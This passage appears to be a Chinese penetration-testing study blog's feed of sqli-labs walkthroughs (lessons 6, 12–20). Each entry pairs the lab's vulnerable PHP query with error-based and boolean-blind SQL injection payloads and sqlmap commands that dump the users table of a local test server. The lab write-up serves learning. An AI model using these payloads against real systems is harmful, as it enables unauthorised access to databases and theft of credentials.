punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/101.0.0.0 Safari/537.36Origin: http://192.168.31.193Content-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,application/signed-exchange<span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span>b3<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>Referer: http://192.168.31.193/less-20/index.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>Cookie: <span class="token assign-left variable">uname</span><span class="token operator">=</span>admin*Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打上*  level 等级2</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">检测注入点sqlmap <span class="token parameter variable">-r</span> <span class="token number">3</span>.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--level</span> <span class="token number">2</span>爆破数据库名sqlmap <span class="token parameter variable">-r</span> <span class="token number">3</span>.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--level</span> <span class="token number">2</span> --current-db爆破数据表名sqlmap <span class="token parameter variable">-r</span> <span class="token number">3</span>.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--level</span> <span class="token number">2</span> <span class="token parameter variable">-D</span> <span class="token string">"security"</span> <span class="token parameter variable">--tables</span>爆破字段内容sqlmap <span class="token parameter variable">-r</span> <span class="token number">3</span>.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--level</span> <span class="token number">2</span> <span class="token parameter variable">-D</span> <span class="token string">"security"</span> <span class="token parameter variable">-T</span> <span class="token string">"users"</span> <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less19</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less18/less19/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less18/less19/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="token variable">$uname</span> and users.password=<span class="token variable">$passwd</span> ORDER BY users.id DESC LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$result1</span> <span class="token operator">=</span> mysql_query<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row1</span> <span class="token operator">=</span> mysql_fetch_array<span class="token punctuation">(</span><span class="token variable">$result1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span><span class="token variable">$row1</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token builtin class-name">echo</span> <span class="token string">'&lt;font color= "#FFFF00" font size = 3 &gt;'</span><span class="token punctuation">;</span><span class="token variable">$insert</span><span class="token operator">=</span><span class="token string">"INSERT INTO <span class="token variable"><span class="token variable">`</span>security<span class="token variable">`</span></span>.<span class="token variable"><span class="token variable">`</span>referers<span class="token variable">`</span></span> (<span class="token variable"><span class="token variable">`</span>referer<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>ip_address<span class="token variable">`</span></span>) VALUES ('<span class="token variable">$uagent</span>', '<span class="token variable">$IP</span>')"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功登录后返回referer位置，说明在<strong>数据包头referer位置有</strong>注入点</p><blockquote><p>Your IP ADDRESS is: 192.168.31.119<br>Your <strong>Referer</strong> is: <a href="http://192.168.31.193/Less-19/">http://192.168.31.193/Less-19/</a></p></blockquote><p><a name="NTGzZ"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p><a name="X6iZN"></a></p><h2 id="爆破数据库名"><a href="#爆破数据库名" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h2><p><code>1',updatexml(1,concat(0x7e,database(),0x7e),1))#</code></p><blockquote><p>Your IP ADDRESS is: 192.168.31.119<br>Your Referer is: 1’,updatexml(1,concat(0x7e,database(),0x7e),1))#<br>XPATH syntax error: ‘<del>security</del>‘</p></blockquote><p><a name="hycyr"></a></p><h2 id="爆破数据表名"><a href="#爆破数据表名" class="headerlink" title="爆破数据表名"></a>爆破数据表名</h2><p><code>1',updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1))#</code> <a name="zblHG"></a></p><h2 id="爆破字段名"><a href="#爆破字段名" class="headerlink" title="爆破字段名"></a>爆破字段名</h2><p><code>1', updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='users' limit 8,1),0x7e),1)) -- +</code> <a name="IHMXL"></a></p><h2 id="爆破字段"><a href="#爆破字段" class="headerlink" title="爆破字段"></a>爆破字段</h2><p><code>1', updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)) -- +</code> <a name="gX5ct"></a></p><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p>将数据包保存后 在referer后面加上*即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST /Less-19/ HTTP/1.1Host: <span class="token number">192.168</span>.31.193Content-Length: <span class="token number">24</span>Cache-Control: max-age<span class="token operator">=</span><span class="token number">0</span>Upgrade-Insecure-Requests: <span class="token number">1</span>Origin: http://192.168.31.193Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/101.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,application/signed-exchange<span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span>b3<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>Referer: http://192.168.31.193/Less-19/*Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>Connection: close<span class="token assign-left variable">passwd</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">检测注入点sqlmap <span class="token parameter variable">-r</span> <span class="token number">2</span>.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--level</span> <span class="token number">4</span>爆破数据库名sqlmap <span class="token parameter variable">-r</span> <span class="token number">2</span>.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--level</span> <span class="token number">4</span> --current-db爆破数据表名sqlmap <span class="token parameter variable">-r</span> <span class="token number">2</span>.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--level</span> <span class="token number">4</span> <span class="token parameter variable">-D</span> <span class="token string">"security"</span> <span class="token parameter variable">--tables</span>爆破字段内容sqlmap <span class="token parameter variable">-r</span> <span class="token number">2</span>.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--level</span> <span class="token number">4</span> <span class="token parameter variable">-D</span> <span class="token string">"security"</span> <span class="token parameter variable">-T</span> <span class="token string">"users"</span> <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less17</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less15/less17/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less15/less17/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT username, password FROM users WHERE username= <span class="token variable">$uname</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>uname=1'</code></p><blockquote><p>[PASSWORD RESET]</p></blockquote><p>提示密码重设置,<br>&amp;#x20;<strong>注入点是密码的位置</strong> <a name="irTrU"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查询数据库表<span class="token assign-left variable">passwd</span><span class="token operator">=</span>admin<span class="token string">' and updatexml(1,concat(0x7e,(select database()),0x7e),1)-- +爆破数据表passwd=1'</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +爆破字段名<span class="token assign-left variable">passwd</span><span class="token operator">=</span><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='</span><span class="token function">users</span><span class="token string">' limit 8,1),0x7e),1) -- +爆破字段passwd=1'</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select username from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less16</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less15/less16/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less15/less16/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$uname</span><span class="token operator">=</span><span class="token string">'"'</span><span class="token builtin class-name">.</span><span class="token variable">$uname</span><span class="token builtin class-name">.</span><span class="token string">'"'</span><span class="token punctuation">;</span><span class="token variable">$passwd</span><span class="token operator">=</span><span class="token string">'"'</span><span class="token builtin class-name">.</span><span class="token variable">$passwd</span><span class="token builtin class-name">.</span><span class="token string">'"'</span><span class="token punctuation">;</span> @<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT username, password FROM users WHERE username=(<span class="token variable">$uname</span>) and password=(<span class="token variable">$passwd</span>) LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span>mysql_query<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在Less15的原题上将闭合方式变成了”) <a name="OMlVf"></a></p><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">判断数据库名称长度admin<span class="token string">") or length(database())=8--+显示蓝色图片，说明数据库长度为8逐一猜解数据库名称admin"</span><span class="token punctuation">)</span> or ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span><span class="token number">115</span>--+第一个字符是s  <span class="token punctuation">..</span>.猜解数据表名称admin<span class="token string">") or ascii(mid<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1))&gt;101 --+第一个字符是e ...猜解字段名称admin"</span><span class="token punctuation">)</span> or ascii<span class="token punctuation">(</span>mid<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and table_name<span class="token operator">=</span>'users'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token operator">=</span><span class="token number">105</span>--+第一个字符是i <span class="token punctuation">..</span>.猜解字段内容admin"<span class="token punctuation">)</span> or ascii<span class="token punctuation">(</span>mid<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> from users<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token operator">=</span><span class="token number">68</span>--+第一个字符是D <span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a name="sVerI"></a></p><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p><a name="OwLMd"></a></p><h2 id="burpsuite抓包"><a href="#burpsuite抓包" class="headerlink" title="burpsuite抓包"></a>burpsuite抓包</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST /Less-16/ HTTP/1.1Host: <span class="token number">192.168</span>.31.193Content-Length: <span class="token number">24</span>Cache-Control: max-age<span class="token operator">=</span><span class="token number">0</span>Upgrade-Insecure-Requests: <span class="token number">1</span>Origin: http://192.168.31.193Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/101.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,application/signed-exchange<span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span>b3<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>Referer: http://192.168.31.193/Less-16/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>Connection: close<span class="token assign-left variable">passwd</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-r</span> <span class="token number">1</span>.txt <span class="token parameter variable">-p</span> <span class="token string">'uname'</span> <span class="token parameter variable">--level</span> <span class="token number">2</span> <span class="token parameter variable">--batch</span>爆破数据库sqlmap <span class="token parameter variable">-r</span> <span class="token number">1</span>.txt <span class="token parameter variable">-p</span> <span class="token string">'uname'</span> <span class="token parameter variable">--level</span> <span class="token number">2</span> <span class="token parameter variable">--batch</span> --current-db爆破表sqlmap <span class="token parameter variable">-r</span> <span class="token number">1</span>.txt <span class="token parameter variable">-p</span> <span class="token string">'uname'</span> <span class="token parameter variable">--level</span> <span class="token number">2</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> security <span class="token parameter variable">--tables</span>脱库sqlmap <span class="token parameter variable">-r</span> <span class="token number">1</span>.txt <span class="token parameter variable">-p</span> <span class="token string">'uname'</span> <span class="token parameter variable">--level</span> <span class="token number">2</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> security <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less14</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less11/less14/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less11/less14/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$uname</span><span class="token operator">=</span><span class="token string">'"'</span><span class="token builtin class-name">.</span><span class="token variable">$uname</span><span class="token builtin class-name">.</span><span class="token string">'"'</span><span class="token punctuation">;</span><span class="token variable">$passwd</span><span class="token operator">=</span><span class="token string">'"'</span><span class="token builtin class-name">.</span><span class="token variable">$passwd</span><span class="token builtin class-name">.</span><span class="token string">'"'</span><span class="token punctuation">;</span> @<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT username, password FROM users WHERE username=<span class="token variable">$uname</span> and password=<span class="token variable">$passwd</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>与Less12的区别闭合方式为**” **&amp;#x20;<br><code>1"</code></p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1”” and password=”” LIMIT 0,1’ at line 1</p></blockquote><p>继续使用updataxml()函数</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查询数据库表-1<span class="token string">" or updatexml(1,concat(0x7e,(select database()),0x7e),1) -- +爆破数据表-1"</span> or updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit <span class="token number">2,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +爆破字段名-1<span class="token string">" or updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='users' limit 8,1),0x7e),1) -- +爆破字段-1"</span> or updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less13</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less11/less13/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less11/less13/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT username, password FROM users WHERE username=('<span class="token variable">$uname</span>') and password=('<span class="token variable">$passwd</span>') LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>与Less12的唯一区别为闭合方式为**’)** &amp;#x20;<br><code>1')</code> <a name="nEKcR"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>用<strong>updatexml()函数</strong>进行报错注入 &amp;#x20;<br>updatexml（1，2，3）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查询字段数<span class="token number">1</span><span class="token string">') order by 3-- + 登录后页面报错Unknown column '</span><span class="token number">3</span><span class="token string">' in '</span>order clause<span class="token string">'1'</span><span class="token punctuation">)</span> order by <span class="token number">2</span>-- +没有提示错误，说明有2个字段；判断回显点<span class="token number">1</span><span class="token string">') union select 1,2 -- +没有显示1，2查询数据库表-1'</span><span class="token punctuation">)</span> or updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +爆破数据表-1<span class="token string">') or updatexml(1,concat(0x7e,(select (table_name)from information_schema.tables where table_schema=database() limit 2,1),0x7e),1) -- +爆破字段名-1'</span><span class="token punctuation">)</span> or updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select <span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span> limit <span class="token number">8,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +爆破字段-1'<span class="token punctuation">)</span> or updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select username from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less12</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less11/less12/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less11/less12/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$uname</span><span class="token operator">=</span><span class="token string">'"'</span><span class="token builtin class-name">.</span><span class="token variable">$uname</span><span class="token builtin class-name">.</span><span class="token string">'"'</span><span class="token punctuation">;</span><span class="token variable">$passwd</span><span class="token operator">=</span><span class="token string">'"'</span><span class="token builtin class-name">.</span><span class="token variable">$passwd</span><span class="token builtin class-name">.</span><span class="token string">'"'</span><span class="token punctuation">;</span> @<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT username, password FROM users WHERE username=(<span class="token variable">$uname</span>) and password=(<span class="token variable">$passwd</span>) LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>1"</code></p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1””) and password=(“”) LIMIT 0,1’ at line 1</p></blockquote><p>用**”)**闭合<br>1”)<br>与Less11的区别就是闭合方式的不一样，注入方式完全一样。 <a name="LDkbm"></a></p><h1 id="试试报错注入"><a href="#试试报错注入" class="headerlink" title="试试报错注入"></a>试试报错注入</h1><p>之前用过了 extractvalue() 函数， updatexml()函数 ，现在试试 floor()函数&amp;#x20;<br><code>-1") union select count(*),concat(0x7e,database(),0x7e,**floor(rand(0)*2)**)x from information_schema.tables **group by x**-- +</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据库-1<span class="token string">") union select count(*),concat(0x7e,database(),0x7e,floor(rand(0)*2))x from information_schema.tables group by x-- +爆破数据表-1"</span><span class="token punctuation">)</span> union <span class="token keyword">select</span> count<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select table_name from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e,floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>*2<span class="token punctuation">))</span>x from information_schema.tables group by x-- +爆破字段表-1<span class="token string">") union select count(*),concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x-- +爆破字段-1"</span><span class="token punctuation">)</span> union <span class="token keyword">select</span> count<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select username from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e,floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>*2<span class="token punctuation">))</span>x from information_schema.tables group by x-- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less6</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/lees5/less6/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/lees5/less6/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string">'"'</span><span class="token builtin class-name">.</span><span class="token variable">$id</span><span class="token builtin class-name">.</span><span class="token string">'"'</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>?id=1"</code></p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1”” LIMIT 0,1’ at line 1</p></blockquote><p>less6与less5的唯一区别在于闭合方式为双引号”\ <a name="MK1Je"></a></p><h1 id="用updatexml-函数进行报错注入"><a href="#用updatexml-函数进行报错注入" class="headerlink" title="用updatexml()函数进行报错注入"></a>用updatexml()函数进行报错注入</h1><p>updatexml(1,1,1) <a name="nAWtm"></a></p><h2 id="查看数据库名称"><a href="#查看数据库名称" class="headerlink" title="查看数据库名称"></a>查看数据库名称</h2><p><code>?id=1" or updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</code></p><blockquote><p>XPATH syntax error: ‘~security’</p></blockquote><p><a name="CeOmH"></a></p><h2 id="查看数据表名称"><a href="#查看数据表名称" class="headerlink" title="查看数据表名称"></a>查看数据表名称</h2><p><code>?id=1" or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</code></p><blockquote><p>XPATH syntax error: ‘<del>emails,referers,uagents,users</del>‘</p></blockquote><p><a name="vqZkZ"></a></p><h2 id="查看字段名称"><a href="#查看字段名称" class="headerlink" title="查看字段名称"></a>查看字段名称</h2><p><code>?id=1" or updatexml(1,concat(0x7e,(select group_concat(column_name) from 